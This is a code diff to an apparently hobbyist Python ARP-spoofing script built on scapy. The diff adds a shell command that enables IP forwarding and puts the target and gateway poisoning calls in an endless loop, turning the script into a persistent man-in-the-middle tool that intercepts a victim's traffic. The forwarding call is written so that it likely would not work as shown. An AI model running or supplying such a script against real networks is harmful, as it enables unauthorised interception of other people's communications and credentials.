@@ -4,6 +4,7 @@ import subprocess
 import scapy.all as scapy
 import argparse
 import re
+import time
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -49,12 +50,17 @@ def arp_spoof_target(target_ip, gateway_ip):
 
 options = get_arguments()
 print("[ ] Script Started.")
-print("[+] Querying for MAC Address..")
+print("[+] Enabling Traffic Flow..")
+subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward")
+print("[+] Enabled Traffic Flow!")
+# print("[+] Querying for MAC Address..")
 # mitm_mac_address = mitm_mac(options.mitm_interface)
-print("[+] Spoofing Target..")
-arp_spoof_target(options.target_ip, options.gateway_ip)
-print("[+] Spoofed Target!")
-print("[+] Spoofing Gateway..")
-arp_spoof_target(options.gateway_ip, options.target_ip)
-print("[+] Spoofed Gateway!")
+while True:
+    print("[+] Spoofing Target..")
+    arp_spoof_target(options.target_ip, options.gateway_ip)
+    print("[+] Spoofed Target!")
+    print("[+] Spoofing Gateway..")
+    arp_spoof_target(options.gateway_ip, options.target_ip)
+    print("[+] Spoofed Gateway!")
+    time.sleep(2)
 print("[X] Script completed!")
